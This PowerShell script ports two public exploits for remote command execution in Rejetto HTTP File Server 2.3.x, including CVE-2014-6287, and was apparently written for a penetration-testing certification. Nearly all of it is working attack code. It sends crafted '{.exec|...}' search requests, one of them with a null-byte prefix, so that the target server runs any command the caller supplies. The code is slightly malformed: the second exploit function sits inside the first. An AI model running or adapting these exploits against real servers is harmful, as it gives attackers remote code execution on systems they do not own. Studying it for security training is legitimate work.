function Invoke-HFS-exploit
{

<#


.SYNOPSIS

A powershell script port for Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution
Exploit Author: Daniele Linguaglossa
CVE : CVE-2014-6287
https://www.exploit-db.com/exploits/34668
 

.EXAMPLE
PS C:\> . .\powershell-exploit.ps1
PS C:\> Invoke-HFS-exploit -IP 127.0.0.1 -port 8080


.LINK
https://www.exploit-db.com/exploits/34668


.NOTES

Student ID : NONE
This blog post has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam: http://www.securitytube-training.com/onlinecourses/powershell-for-pentesters/


#>
    
    [CmdletBinding()]
    param
    (

    [Parameter (Mandatory=$true, Position = 0)]
    [string]
    $IP,

    [Parameter (Mandatory=$true, Position = 1)]
    [string]
    $port,

    [Parameter (Mandatory=$false, Position = 2)]
    [string]
    $Payload='calc'

    )

    #prefix for the payload
    $pre ="/?search=%00{.exec|$Payload.}"

    #buliding the url
    $url = "http://" + $IP + ":" +$port+$pre

    # Creating url for request
    $req = [system.Net.WebRequest]::Create($url)
    #sending request to exploit
    $res = $req.GetResponse()




    function Invoke-FHFS-exploit
{

<#


.SYNOPSIS
A powershell script port for Rejetto HTTP File Server (FHFS) 2.3.x - Remote Command Execution
Exploit # Author: Naser Farhadi

https://www.exploit-db.com/exploits/37985
 

.EXAMPLE
PS C:\> . .\powershell-exploit.ps1
PS C:\> Invoke-FHFS-exploit -IP 127.0.0.1 -port 80


.LINK
https://www.exploit-db.com/exploits/37985


.NOTES

Student ID : NONE
This blog post has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam: http://www.securitytube-training.com/onlinecourses/powershell-for-pentesters/


#>
    
    [CmdletBinding()]
    param
    (

    [Parameter (Mandatory=$true, Position = 0)]
    [string]
    $IP,

    [Parameter (Mandatory=$true, Position = 1)]
    [string]
    $port,

    [Parameter (Mandatory=$false, Position = 2)]
    [string]
    $Payload='calc'

    )

    #prefix for the payload
    $pre ="/?{.exec|$Payload.}"

    #buliding the url
    $url = "http://" + $IP + ":" +$port+$pre

    # Creating url for request
    $req = [system.Net.WebRequest]::Create($url)
    #sending request to exploit
    $res = $req.GetResponse()





}
}
